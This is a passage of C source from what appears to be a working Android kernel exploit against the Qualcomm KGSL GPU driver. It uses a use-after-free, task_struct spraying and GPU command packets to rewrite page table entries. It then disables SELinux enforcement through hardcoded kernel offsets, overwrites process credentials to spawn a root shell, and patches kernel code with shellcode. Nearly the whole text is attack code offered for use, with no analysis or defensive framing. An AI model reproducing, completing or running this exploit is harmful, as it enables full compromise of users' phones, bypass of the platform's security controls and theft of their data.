    struct kgsl_gpuobj_alloc ib_alloc = { .size = PAGE_SIZE * 4, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
        mk("phase1 ib alloc FAILED");
        _exit(0);
    }
    unsigned ib_id2 = ib_alloc.id;
    void *ib_vma2 = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)ib_id2) << 12);
    if (ib_vma2 == MAP_FAILED) { mk("phase1 ib mmap FAILED"); _exit(0); }
    struct kgsl_gpuobj_info info2 = { .id = ib_id2 };
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info2);
    uint64_t ib_gpu2 = info2.gpuaddr;
    struct kgsl_gpuobj_alloc dump_alloc = { .size = PAGE_SIZE * 2, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    unsigned dump_id = 0; void *dump_vma = NULL; uint64_t dump_gpu = 0;
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dump_alloc) == 0) {
        dump_id = dump_alloc.id;
        dump_vma = mmap(NULL, dump_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)dump_id) << 12);
        if (dump_vma != MAP_FAILED) {
            struct kgsl_gpuobj_info di = { .id = dump_id };
            ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &di);
            dump_gpu = di.gpuaddr;
        }
    }
    uint64_t PFN_MASK = PHYS_MASK & PAGE_MASK;

    uint64_t pte_slot = va + 8 * sig_num[0];
    uint64_t orig = 0, pte1 = 0;
    gpu_read64(fd, ib_vma2, ib_alloc.mmapsize, dump_vma, ib_gpu2, dump_gpu, ib_id2, ctx_id2p, pte_slot, &orig);
    gpu_read64(fd, ib_vma2, ib_alloc.mmapsize, dump_vma, ib_gpu2, dump_gpu, ib_id2, ctx_id2p, va + 8 * sig_num[1], &pte1);
    {
        char m2[160];
        snprintf(m2, sizeof(m2), "phase2 va=0x%llx pte_slot=0x%llx orig=0x%llx pte1=0x%llx",
                 (unsigned long long)va, (unsigned long long)pte_slot,
                 (unsigned long long)orig, (unsigned long long)pte1);
        mk(m2); fprintf(stderr, "%s\n", m2);
    }

    /* the one-shot mirror re-pointed the sig pages' PTEs to candidate kernel phys.
     * Reads do not trigger the watchdog. Check each candidate page for the Image
     * header (ARM\x64 at +0x38) or the linux_banner string. */
    {
        int ufault = 0;
        for (int j = 0; j < 1; j++) {
            uint64_t uj = gb_target_addr + PAGE_SIZE * (uint64_t)sig_num[j];
            const uint8_t *pb = NULL;
            volatile uint64_t *q = NULL;
            if (sigsetjmp(g_jb, 1) == 0) {
                g_jb_armed = 1;
                pb = (const uint8_t *)(uintptr_t)uj;
                q = (volatile uint64_t *)(uintptr_t)uj;
                g_jb_armed = 0;
            } else {
                g_jb_armed = 0;
                ufault++;
                continue;
            }
            {
                /* dump 128 bytes of the candidate struct (cand = its base) */
                uint64_t so = g_kern_cand_phys & 0xFFF;
                volatile uint8_t *sp = (volatile uint8_t *)(uintptr_t)(uj + so);
                char msd[200];
                int n = 0, c = 0;
                msd[0] = 0;
                {
                    int o2 = 0;
                    char tbuf[32];
                    int len = snprintf(tbuf, sizeof(tbuf), "phase2 struct[0x%02x]:", (unsigned)so);
                    memcpy(msd, tbuf, len); n = len;
                    for (o2 = 0; o2 < 128; o2++) {
                        if (o2 && (o2 % 16) == 0) { msd[n++] = ' '; msd[n++] = '|'; msd[n++] = ' '; }
                        len = snprintf(tbuf, sizeof(tbuf), "%02x", sp[o2]);
                        memcpy(msd + n, tbuf, len); n += len;
                        (void)c;
                    }
                    msd[n] = 0;
                }
                mk(msd); fprintf(stderr, "%s\n", msd);
            }
            {
                char md[192];
                snprintf(md, sizeof(md),
                         "phase2 u%d=0x%llx: %016llx %016llx %016llx %016llx | %016llx %016llx %016llx %016llx",
                         j, (unsigned long long)uj, (unsigned long long)q[0],
                         (unsigned long long)q[1], (unsigned long long)q[2], (unsigned long long)q[3],
                         (unsigned long long)q[4], (unsigned long long)q[5], (unsigned long long)q[6],
                         (unsigned long long)q[7]);
                mk(md); fprintf(stderr, "%s\n", md);
            }
            if (*(uint32_t *)(pb + 0x38) == 0x644d5241) {
                char mh[96];
                snprintf(mh, sizeof(mh), "phase2 ImageHeader at u%d phys=0x%llx!", j,
                         (unsigned long long)(g_kern_cand_phys + 0x2000000ULL * (uint64_t)j));
                mk(mh);
                fprintf(stderr, "%s\n", mh);
            }
            int has_banner = 0;
            for (int off = 0; off < 0x1000 - 32; off += 8) {
                if (pb[off] == 'L' && memcmp(pb + off, "Linux version", 13) == 0) { has_banner = 1; break; }
            }
            if (has_banner) {
                char mh[96];
                snprintf(mh, sizeof(mh), "phase2 BANNER at u%d phys=0x%llx!", j,
                         (unsigned long long)(g_kern_cand_phys + 0x2000000ULL * (uint64_t)j));
                mk(mh);
                fprintf(stderr, "%s\n", mh);
            }
        }
        if (ufault) {
            char mf[64];
            snprintf(mf, sizeof(mf), "phase2 u-faults=%d", ufault);
            mk(mf);
        }
        signal(SIGBUS, die_handler);
        signal(SIGSEGV, die_handler);
    }
    fprintf(stderr, "[PHASE1] done\n");
    _exit(0);
#endif

#if !STAGE34_ONLY
        fprintf(stderr, "\n[11] Spraying task_struct\n");
        
        char qwerqwer[0x500] = {0};
        pid_t spray_pids[SPRAY_COUNT_MAX];
        fd2 = open("/dev/null", O_RDWR | O_CREAT | O_TRUNC, 0644);
        write(fd2,qwerqwer,0x500);
        int spray_success = 0;
        fd_zero = -1;
        fd_zero = open("/dev/zero", O_RDONLY);
        
        char buffer_zero[0x100];
        memset(buffer_zero, 0, sizeof(buffer_zero)); 
        write(fd_zero, buffer_zero, sizeof(buffer_zero));
        lseek(fd_zero,0,SEEK_SET);
        mk("spray loop start");
        for (int i = 0; i < spray_count; i++) {
            pid_t pid = fork();
            if ((i % 200) == 0) { char mb[40]; snprintf(mb, sizeof(mb), "spray fork i=%d", i); mk(mb); }

            if (pid == 0) {
                struct kgsl_gpuobj_free free_obj = {0};

                close(fd);
#if !CRED_OVERWRITE
                {
                    int dn = open("/dev/null", O_WRONLY);
                    if (dn >= 0) { dup2(dn, 1); dup2(dn, 2); close(dn); }
                }
#endif

                // set task name
                char proc_name[16];  // TASK_COMM_LEN
                memset(proc_name,0,16);
                pid_t self = getpid();
                snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, self);
                prctl(PR_SET_NAME, proc_name, 0, 0, 0);
                int idx = i;
                spray_ctrl[idx].pid=self;
                spray_ctrl[idx].do_action=0;
                while(1){
                    (*(uint32_t *)&gbuf[0x960])++;
#if CRED_OVERWRITE
                    if(spray_ctrl[idx].do_action==2){
                        /* cred-overwrite: report uid always (diagnostic), exec shell if root */
                        uid_t u = getuid();
                        {
                            char rpf[600];
                            snprintf(rpf, sizeof(rpf), "%s/rootproof.txt", g_workdir);
                            int rfd = open(rpf,
                                           O_CREAT | O_TRUNC | O_WRONLY, 0777);
                            if (rfd >= 0) {
                                char rb[64];
                                int rl = snprintf(rb, sizeof(rb), "UID=%d EUID=%d\n", u, geteuid());
                                write(rfd, rb, rl);
                                close(rfd);
                            }
                        }
                        if (u == 0) {
                            mk("cred child is ROOT");
                            {
                                int z = open("/dev/tty", O_RDWR);
                                if (z >= 0) { dup2(z, 0); dup2(z, 1); dup2(z, 2); close(z); }
                            }
                            execl("/system/bin/sh", "sh", NULL);
                            _exit(0);
                        }
                        poll(NULL, 0, 50);
                        continue;
                    }
#endif
                    if(spray_ctrl[idx].do_action==1 && gbuf[0]==0xab){
                        gbuf[0x982] = 0xaa;   /* fire entered (mem only) */
                        /* NOTE: this child may have addr_limit=KERNEL_DS (patched by the
                         * parent). ANY syscall that copies to/from a user buffer here will
                         * treat the user pointer as a kernel address and fault (nanosleep,
                         * mk(), fprintf()). Use ONLY the intended kernel-copy syscalls and
                         * shared-memory gbuf communication. No logging. */
                        uint64_t a = *(uint64_t *)&gbuf[LEAK_ADDR];
                        int n = (int)*(uint64_t *)&gbuf[LEAK_LEN];
                        uint64_t zaddr = *(uint64_t *)&gbuf[SET_TASKS];
                        uint64_t p     = *(uint64_t *)&gbuf[POST_ADDR];
                        *(uint64_t *)&gbuf[0x990] = a;   /* record target (mem only) */
                        gbuf[0x982] = 0xab;   /* read values done */
                        /* DEFENSE: never act on a non-kernel address under KERNEL_DS,
                         * and clamp the copy length so a stale/corrupt trigger cannot
                         * fault on a user VA (observed: write(0x702744000, 0x2000)). */
                        int bad = 0;
                        if (a) {
                            if ((a >> 48) != 0xffffULL || a < 0xffffff8000000000ULL ||
                                a == 0xffffffffffffffffULL) bad = 1;
                        }
                        if (zaddr &&
                            ((zaddr >> 48) != 0xffffULL || zaddr < 0xffffff8000000000ULL ||
                             zaddr == 0xffffffffffffffffULL)) bad = 1;
                        if (p &&
                            ((p >> 48) != 0xffffULL || p < 0xffffff8000000000ULL ||
                             p == 0xffffffffffffffffULL)) bad = 1;
                        if (n <= 0 || n > 0x1000) n = 0x10;
                        if (bad) {
                            /* silently drop a bad trigger (no logging: syscalls unsafe) */
                            spray_ctrl[idx].do_action = 0;
                            *(uint64_t *)&gbuf[LEAK_ADDR] = 0;
                            *(uint64_t *)&gbuf[LEAK_LEN]  = 0;
                            *(uint64_t *)&gbuf[SET_TASKS] = 0;
                            *(uint64_t *)&gbuf[POST_ADDR] = 0;
                            gbuf[0] = 0;
                            continue;
                        }
#if DIAG_NOOP_CHILD
                        /* diagnostic: no syscalls at all, just signal via gbuf */
                        *(uint64_t *)&gbuf[LEAK_DONE] = 0x55;
                        spray_ctrl[idx].do_action = 0;
                        gbuf[0] = 0;
                        continue;
#else
#if DIAG_ZERO_ONLY
                        /* diagnostic: only the zero read into SET_TASKS (kernel dest) */
                        ssize_t z = -1;
                        gbuf[0x982] = 0xbc;
                        if (zaddr && fd_zero >= 0) {
                            lseek(fd_zero, 0, SEEK_SET);
                            z = read(fd_zero, (void *)(uintptr_t)zaddr, 1);
                        }
                        gbuf[0x982] = 0xcd;
                        *(uint64_t *)&gbuf[LEAK_DONE] = (uint64_t)z;
                        *(uint64_t *)&gbuf[LEAK_RES]  = 0;
#else
                        /* kernel READ leak of LEAK_ADDR window */
                        ssize_t k = -1;
                        gbuf[0x982] = 0xbc;   /* before write syscall */
                        {
                            int leak_fd = DIAG_DEVNULL ? 1 : (DIAG_FILE_LEAK ? fd2 : g_leaksock[1]);
                            if (leak_fd >= 0 && a) {
                                if (DIAG_FILE_LEAK) lseek(leak_fd, 0, SEEK_SET);
                                k = write(leak_fd, (void *)(uintptr_t)a, (size_t)n);
                            }
                        }
                        gbuf[0x982] = 0xcd;   /* write returned */
                        ssize_t z = -1;
#ifndef DIAG_WRITE_ONLY
                        /* kernel WRITE: zero ONE byte (enforcing) via read(fd_zero) */
                        if (zaddr && fd_zero >= 0) {
                            lseek(fd_zero, 0, SEEK_SET);
                            z = read(fd_zero, (void *)(uintptr_t)zaddr, 1);
                        }
                        /* leak POST window (selinux_state after zero) */
                        if (g_leaksock[1] >= 0 && p) {
                            (void)write(g_leaksock[1], (void *)(uintptr_t)p, 0x10);
                        }
#endif
                        *(uint64_t *)&gbuf[LEAK_DONE] = (uint64_t)z;
                        *(uint64_t *)&gbuf[LEAK_RES]  = (uint64_t)k;
#endif /* DIAG_ZERO_ONLY */
                        /* consume the trigger: clear values + arm byte so no stale or
                         * orphan child can re-fire on old pointers */
                        *(uint64_t *)&gbuf[LEAK_ADDR] = 0;
                        *(uint64_t *)&gbuf[LEAK_LEN]  = 0;
                        *(uint64_t *)&gbuf[SET_TASKS] = 0;
                        *(uint64_t *)&gbuf[POST_ADDR] = 0;
                        gbuf[0] = 0;
                        spray_ctrl[idx].do_action = 0;
                        continue;
#endif /* DIAG_NOOP_CHILD */
                    }
                    /* WARNING: if this child was patched to KERNEL_DS, sleep()/usleep()
                     * (nanosleep) faults because it copies the timespec to/from a user
                     * buffer. Use poll(NULL,0,ms): with zero fds it never touches user
                     * memory, so it is safe under KERNEL_DS. Short interval so the armed
                     * child fires well before the delayed GPU-fault panic (~500ms). */
                    poll(NULL, 0, 50);
                }
            }
                

            else if (pid > 0){
                spray_success++;
            }
            else{
                spray_pids[i]=-1;
            }
            //usleep(10);
        }
        mk("spray loop done");
        fprintf(stderr, "    [+] Sprayed %d processes with names: %s0000 ~ %s%04d\n",
                spray_success, MARKER_NAME, MARKER_NAME, spray_success - 1);
        
        usleep(20);
        mk("stage1 scan start");

        fprintf(stderr, "\n[12] Scanning UAF region for non-zero data\n");
        struct nonzero_page found_pages[FINDING];
        int num_found = 0;
        uint64_t found_va = 0;
        int found_count = 0;

        if (scan_uaf_for_nonzero_multi(fd, found_pages, &num_found)) {
            fprintf(stderr, "\n");
            fprintf(stderr, " NON-ZERO PAGES FOUND IN UAF REGION!\n");
            fprintf(stderr, "Count: %d pages\n", num_found);
            mk("stage1 scan done");

        } else {
            fprintf(stderr,
                    "\n    [!] scan_uaf_for_nonzero_multi failed (only_once != 1). Cleaning up and restarting...\n");
            fprintf(stderr, "        [PROBE] no task_struct found in first scan, exiting probe\n");
            fflush(stderr);
            mk("stage1 scan FAILED");
            /* kill spray children BEFORE exiting, otherwise 8000 orphans keep sleeping
             * in the gbuf-trigger loop forever */
            for (int i = 0; i < spray_count; i++) {
                if (spray_ctrl[i].pid > 0) {
                    kill(spray_ctrl[i].pid, SIGTERM);
                }
            }
            for (int i = 0; i < spray_count; i++) {
                if (spray_ctrl[i].pid > 0) {
                    waitpid(spray_ctrl[i].pid, NULL, 0);
                }
            }
            _exit(0);

            for (int i = 0; i < spray_count; i++) {
                if (spray_ctrl[i].pid > 0) {
                    kill(spray_ctrl[i].pid, SIGTERM);
                }
            }
            for (int i = 0; i < spray_count; i++) {
                if (spray_ctrl[i].pid > 0) {
                    waitpid(spray_ctrl[i].pid, NULL, 0);
                }
            }

            if (fd_zero >= 0) {
                close(fd_zero);
                fd_zero = -1;
            }
            if (fd2 >= 0) {
                close(fd2);
                fd2 = -1;
            }

            if (overlap_vma && overlap_vma != MAP_FAILED) {
                munmap(overlap_vma, overlap_mmapsize);
                overlap_vma = NULL;
            }
            if (ph_vma && ph_vma != MAP_FAILED) {
                munmap(ph_vma, ph_mmapsize);
                ph_vma = NULL;
            }
            if (bogus_vma && bogus_vma != MAP_FAILED) {
                munmap(bogus_vma, PAGE_SIZE * 3);
                bogus_vma = NULL;
            }

            struct kgsl_gpuobj_free free_obj = {0};
            if (overlap_id) {
                free_obj.id = overlap_id;
                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
                overlap_id = 0;
            }
            if (ph_id) {
                free_obj.id = ph_id;
                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
                ph_id = 0;
            }
            if (uaf_id) {
                free_obj.id = uaf_id;
                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
                uaf_id = 0;
            }

            if (fd >= 0) {
                close(fd);
                fd = -1;
            }

            memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
            if (spray_count + SPRAY_COUNT_STEP <= SPRAY_COUNT_MAX) {
                spray_count += SPRAY_COUNT_STEP;
            } else {
                spray_count = SPRAY_COUNT_MAX;
            }
            goto restart;
        }
        
    for (int i = 0; i < spray_count; i++) {
        if(spray_ctrl[i].do_action==0){
            kill(spray_ctrl[i].pid,SIGTERM);
        }
    }
    for (int i = 0; i < spray_count; i++) {
        if(spray_ctrl[i].do_action==0){
            waitpid(spray_ctrl[i].pid,NULL,0);
        }
    }
    


    uint64_t kbase = (*(uint64_t *)&gbuf[0x20]);
    uint64_t init_cred = kbase + 0x24D90D0;
    uint64_t poweroff_cmd = kbase+0x2BB8EC0;
    uint64_t orderly_poweroff = kbase + 0x5F96C;
    uint64_t memstart_addr = kbase + 0x24C2538;
    selinux_enforcing = kbase+0x2F74CE8;
    *(uint64_t *)&gbuf[SET_TASKS]=selinux_enforcing;
    sleep(1);
    fprintf(stderr, "child start %lx\n", *(uint64_t *)&gbuf[SET_TASKS]);
    gbuf[0] = 0xab;
    while(1){
        if(gbuf[TASK_SPRAY_CLEAR]==0x1){
            fprintf(stderr,"child read fail\n");
            break;
        }
        else if (gbuf[TASK_SPRAY_CLEAR]==0x2){
            fprintf(stderr,"child read success\n");
            break;
        }
        else if (gbuf[TASK_SPRAY_CLEAR]==0x3){
            fprintf(stderr, "ret is 0\n");
            break;
        }
    }
#endif /* !STAGE34_ONLY */
    
    mmap_spray();
    struct nonzero_page pages2[MAX_FOUND_PAGES];
    int num_pages2 = 0;
    if (scan_uaf_and_collect(fd, pages2, &num_pages2)){
    }
    else{
        fprintf(stderr, "[!] No pages found in UAF region\n");
    }
    gbuf[0x910]=1;
    mmap_check();
    sleep(1); // for context switching
    fprintf(stderr,"mmap_check complete.\n");
    uint32_t rb_count = *(uint32_t *)(gbuf+0xb00);
    struct kgsl_drawctxt_create ctx2 = {
            .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
        };
    if (ioctl(fd,IOCTL_KGSL_DRAWCTXT_CREATE, &ctx2) == 0){
        unsigned ctx_id2 = ctx2.drawctxt_id;
        struct kgsl_gpuobj_alloc ib_alloc = {
            .size = PAGE_SIZE *4,
            .flags = KGSL_MEMFLAGS_USE_CPU_MAP
        };
        if(ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc)==0){
            unsigned ib_id2 = ib_alloc.id;
            void * ib_vma2 = mmap(NULL,ib_alloc.mmapsize, PROT_READ | PROT_WRITE , MAP_SHARED ,fd,((off_t)ib_id2) <<12);
            if (ib_vma2 != MAP_FAILED){
                struct kgsl_gpuobj_info info ={ .id=ib_id2 };
                ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
                uint64_t ib_gpu2  = info.gpuaddr;

                struct kgsl_gpuobj_alloc dump_alloc ={
                    .size = PAGE_SIZE*2,
                    .flags = KGSL_MEMFLAGS_USE_CPU_MAP
                };
                unsigned dump_id = 0;
                void * dump_vma = NULL;
                uint64_t dump_gpu = 0;
                if(ioctl(fd,IOCTL_KGSL_GPUOBJ_ALLOC,&dump_alloc)==0){
                    dump_id = dump_alloc.id;
                    dump_vma = mmap(NULL, dump_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)dump_id)<<12);
                    if (dump_vma != MAP_FAILED){
                        struct kgsl_gpuobj_info dump_info = {.id=dump_id};
                        ioctl(fd,IOCTL_KGSL_GPUOBJ_INFO,&dump_info);
                        dump_gpu = dump_info.gpuaddr;
                        
                    }
                    else{
                        dump_vma=NULL;
                    }
                }
                else{
                    fprintf(stderr,"dump_alloc");
                }

                fprintf(stderr, "rb_count: %u\n", rb_count);
                for(uint32_t ri = 0; ri < rb_count; ri++){
                    uint64_t va = *(uint64_t *)(gbuf + 0xb08 + ri * 24);
                    fprintf(stderr, "VA : %llx\n", (unsigned long long)va);
                    uint32_t *cmd = (uint32_t *)ib_vma2;
                    int dw = 0;
                    uint32_t d_lo, d_hi, s_lo, s_hi;
                    fprintf(stderr,"check1\n");
                    memset(ib_vma2,0,ib_alloc.mmapsize);
                    cmd[dw++] = cp_type7_packet(CP_NOP,0);
                    if (dump_vma){
                        fprintf(stderr, "dump_vma %p\n", dump_vma);
                        for(int i_dump = 0; i_dump < 0x80; i_dump++){
                            split64(dump_gpu + (uint64_t)i_dump * 4, &d_lo, &d_hi);
                            split64(va + (uint64_t)i_dump * 4, &s_lo, &s_hi);
                            cmd[dw++] =cp_type7_packet(CP_MEM_TO_MEM,5);
                            cmd[dw++] = 0;
                            cmd[dw++] = d_lo;
                            cmd[dw++] = d_hi;
                            cmd[dw++] = s_lo;
                            cmd[dw++] = s_hi;
                        }
                    }
                    else{
                        fprintf(stderr,"WWDDWFWEFE");
                    }
                    cmd[dw++] = cp_type7_packet(CP_NOP,0);

                    size_t bytes = (size_t)dw * 4;
                    msync(ib_vma2, bytes, MS_SYNC);
                    struct kgsl_command_object obj = {
                        .gpuaddr=ib_gpu2,
                        .size = bytes,
                        .flags = KGSL_CMDLIST_IB,
                        .id = ib_id2
                    };

                    struct kgsl_gpu_command c = {0};
                    c.cmdlist = (uint64_t)(uintptr_t)&obj;
                    c.cmdsize = sizeof(obj);
                    c.numcmds = 1;
                    c.context_id = ctx_id2;

                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND,&c) != 0 || wait_timestamp(fd, ctx_id2, c.timestamp) != 0 ){
                        fprintf(stderr,
                                "       [!] GPU copy failed (read) for VA 0x%llx\n",
                                (unsigned long long)va);
                        continue;
                    }

                    if(!dump_vma) continue;
                    msync(dump_vma, 0x200, MS_SYNC | MS_INVALIDATE);
                    write(fd2,dump_vma,0x200);
                    write(fd2,"aaaaaaaaaaaaaaa",0x10);
                    uint64_t orig =  *(uint64_t *)((uint8_t *)dump_vma + 8*sig_num[0]);
                    uint64_t pte1 = *(uint64_t *)((uint8_t *)dump_vma + 8*sig_num[1]);
                    uint64_t src = *(uint64_t *)((uint8_t *)dump_vma + 0x130);

                    const uint64_t PFN_MASK = PHYS_MASK & PAGE_MASK;
                    uint64_t orig_pfn = orig & PFN_MASK;
                    uint64_t pte1_pfn = pte1 & PFN_MASK;
                    uint64_t src_pfn = src & PFN_MASK;

                    if (src_pfn == 0){
                        fprintf(stderr,
                                "       [!] Skip patch: src PFN at 0x130 is empty VA : 0x%llx\n",
                                (unsigned long long)va);
                        continue;
                    }
                    uint64_t new_pte = (orig & ~PFN_MASK) | src_pfn;
                    uint64_t copied_pfn = src_pfn;
                    memset(ib_vma2, 0 , ib_alloc.mmapsize);
                    dw = 0;
                    cmd = (uint32_t *)ib_vma2;

                    for (int i=0; i<4; i++){
                        cmd[dw++] = cp_type7_packet(CP_NOP,0);
                    }
                    split64(va+ (uint64_t)sig_num[0]*8 ,&d_lo,&d_hi);
                    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE,3);
                    cmd[dw++] = d_lo;

                    cmd[dw++] = d_hi;
                    cmd[dw++] = (uint32_t) (new_pte & 0xffffffffu);

                    split64(va+4+(uint64_t)sig_num[0]*8 , &d_lo, &d_hi);
                    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE,3);
                    cmd[dw++] = d_lo;
                    cmd[dw++] = d_hi;
                    cmd[dw++] = (uint32_t)(new_pte >>32);
                    for(int i=0;i<4;i++){
                        cmd[dw++] = cp_type7_packet(CP_NOP,0);
                    }
                    bytes = (size_t)dw * 4;
                    msync(ib_vma2, bytes , MS_SYNC);
                    obj.size = bytes;
                    memset(&c,0,sizeof(c));
                    c.cmdlist = (uint64_t)(uintptr_t)&obj;
                    c.cmdsize = sizeof(obj);
                    c.numcmds = 1;
                    c.context_id = ctx_id2;

                    if(ioctl(fd,IOCTL_KGSL_GPU_COMMAND, &c)==0 && wait_timestamp(fd,ctx_id2,c.timestamp) == 0 ) {
                        fprintf(stderr,"        [*] Patched PTE PFN From 0x130 -> 0x0 for VA 0x%llx (orig PFN 0x%llx, pte1 PFN 0x%llx, src PFN 0x%llx copied PFN bits 0x%llx)\n",
                            (unsigned long long)va,
                            (unsigned long long)orig_pfn,
                            (unsigned long long)pte1_pfn,
                            (unsigned long long)src_pfn,
                            (unsigned long long)copied_pfn);

                    } 
                    else {
                        fprintf(stderr,
                                "        [!] GPU patch (write stage) failed for VA 0x%llx\n",
                                (unsigned long long)va);
                    }
                    memset(ib_vma2,0,ib_alloc.mmapsize);
                    dw = 0;
                    cmd = (uint32_t * )ib_vma2;
                    cmd[dw++] = cp_type7_packet(CP_NOP,0);
                    for (int i_dump = 0; i_dump < 0x80; i_dump++){
                        split64(dump_gpu +(uint64_t)i_dump *4, &d_lo, &d_hi);
                        split64(va+(uint64_t)i_dump *4, &s_lo, &s_hi);
                        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM,5);
                        cmd[dw++] = 0;
                        cmd[dw++]= d_lo;
                        cmd[dw++] = d_hi;
                        cmd[dw++] = s_lo;
                        cmd[dw++] = s_hi;
                        
                    }
                    cmd[dw++] = cp_type7_packet(CP_NOP,0);
                    bytes = (size_t) dw * 4;
                    msync(ib_vma2, bytes, MS_SYNC);
                    
                    obj.size = bytes;
                    memset(&c, 0 ,sizeof(c));
                    c.cmdlist = (uint64_t) (uintptr_t) & obj;
                    c.cmdsize = sizeof(obj);
                    c.numcmds = 1;
                    c.context_id = ctx_id2;

                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) ==0 && wait_timestamp(fd,ctx_id2, c.timestamp)==0){
                        msync(dump_vma, 0x200, MS_SYNC | MS_INVALIDATE);
                        write(fd2,dump_vma,0x200);
                    }
                    fprintf(stderr, "everything over\n");
                    uint64_t orig_pte_slot = *(uint64_t *)(gbuf + 0xb10 + ri * 24);
                    uint64_t pte1_slot = *(uint64_t *)(gbuf + 0xb18 + ri * 24);
                    fprintf(stderr,
                            "orig pte 0x%llx, pte1 0x%llx ",
                            (unsigned long long)orig_pte_slot,
                            (unsigned long long)pte1_slot);




                }
                
                if (dump_vma) {
                    munmap(dump_vma, dump_alloc.mmapsize);

                }
                if(dump_id){
                    struct kgsl_gpuobj_free fr_dump = {0};
                    fr_dump.id = dump_id;
                    ioctl(fd,IOCTL_KGSL_GPUOBJ_FREE,&fr_dump);
                }
                munmap(ib_vma2,ib_alloc.mmapsize);
                
            }
            else{
                fprintf(stderr,"alloc vma2");
            }
            
            struct kgsl_gpuobj_free fr = {0};
            fr.id = ib_id2;
            ioctl(fd,IOCTL_KGSL_GPUOBJ_FREE,&fr);
            
        }
        else{
            fprintf(stderr,"ibALLOC\n");
        }
        
    }
    else{
        fprintf(stderr,"IOCTL_KGSL_DRAWCTXT_CREATE");
    }
    
    fprintf(stderr, "done!@#!@#\n");
    write(fd2,(void *)(gb_target_addr+0x1000),0x1000);

    fprintf(stderr, "exploit start!\n");
#if !STAGE34_ONLY
    waitpid(*(uint64_t *)&gbuf[TARGET_PIDPID],NULL, 0);
    int still = 0;
    for (int i = 0; i < spray_count; i++) {
        pid_t p = spray_ctrl[i].pid;
        if (p <= 0) continue;
        if (kill(p, 0) == 0) {
            still++;
            fprintf(stderr, "[!] pid still exists=%d\n", p);
        }
    }
    fprintf(stderr, "[*] spray exists count=%d\n", still);
#endif

    int nice_idx=-1;
    char recover_path[600];
    snprintf(recover_path, sizeof(recover_path), "%s/recover", g_workdir);
    int fd_recover = open(recover_path,O_RDWR | O_CREAT | O_TRUNC,0777);
    write(fd_recover,(void *)(*(uint64_t *)&gbuf[0x400]+0x1659c),287);
    lseek(fd_recover,0,SEEK_SET);
    uint64_t first= *(uint64_t *)(gb_target_addr+PAGE_SIZE + 0x59c);


    fprintf(stderr, "first 8 : %lx\n",first);
    fprintf(stderr,"protect success\n");
    
    
    if (first==0xA9067BFDD10303FF){
        lseek(fd_shellcode,0,SEEK_SET);
        
        if (read(fd_shellcode,(void *)(gb_target_addr+PAGE_SIZE + 0x59c),287)<=0){
            fprintf(stderr,"read not success\n");
            perror("read");
        }
        //flush_icache((void *)(gb_target_addr+PAGE_SIZE+0x2d4),(size_t)287);
        fprintf(stderr,"read success\n");
        fprintf(stderr, "second 8 : %lx\n",*(uint64_t *)(gb_target_addr+PAGE_SIZE + 0x59c));
    }
    if (first==0xA9067BFDD10303FF){
        fprintf(stderr,"nice job\n");
    }        


    
    
    gbuf[FOUND_PID]=0x11;
    waitpid(pid, NULL, 0); 
    
    
    while(1){

        

        if (gbuf[CALL_LOGLINE]==0x11){
            fprintf(stderr,"[+] TRIGGERED! Holding init...\n");
            
            break;
        }
        usleep(500);
    }

    usleep(500000);

    ssize_t recover_len = read(fd_recover,(void *)(gb_target_addr+PAGE_SIZE+0x59c),287);
    //flush_icache((void *)(gb_target_addr+PAGE_SIZE+0x2d4),(size_t)recover_len);
    recover_origin(fd);

    
    sleep(1);
    struct kgsl_gpuobj_free free_req = {0};


    if (ph_id) {
        free_req.id = ph_id;
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0) {
            perror("cleanup: free ph_id"); 
        } else {
            fprintf(stderr, "    [+] Freed Placeholder ID %u\n", ph_id);
        }
        ph_id = 0;
    }
    

    if (overlap_id) {
        free_req.id = overlap_id;
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0) {
            perror("cleanup: free overlap_id");
        } else {
            fprintf(stderr, "    [+] Freed Overlap ID %u\n", overlap_id);
        }
        overlap_id = 0;
    }
    
    if (uaf_id) {
        free_req.id = uaf_id;
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0) {
            perror("cleanup: free uaf_id");
        } else {
            fprintf(stderr, "    [+] Freed UAF ID %u\n", uaf_id);
        }
        uaf_id = 0;
    }
    


    if (overlap_vma && overlap_vma != MAP_FAILED) {
        munmap(overlap_vma, overlap_mmapsize);
    }
    if (ph_vma && ph_vma != MAP_FAILED) {
        munmap(ph_vma, ph_mmapsize);
    }
    if (bogus_vma && bogus_vma != MAP_FAILED) {
        munmap(bogus_vma, PAGE_SIZE * 3);
    }
    close(fd_zero);
    close(fd2);
    close(fd_lib);
    close(fd_shellcode);
    close(fd);
    usleep(100);
    mmap_spray_free();
    return 0;

}
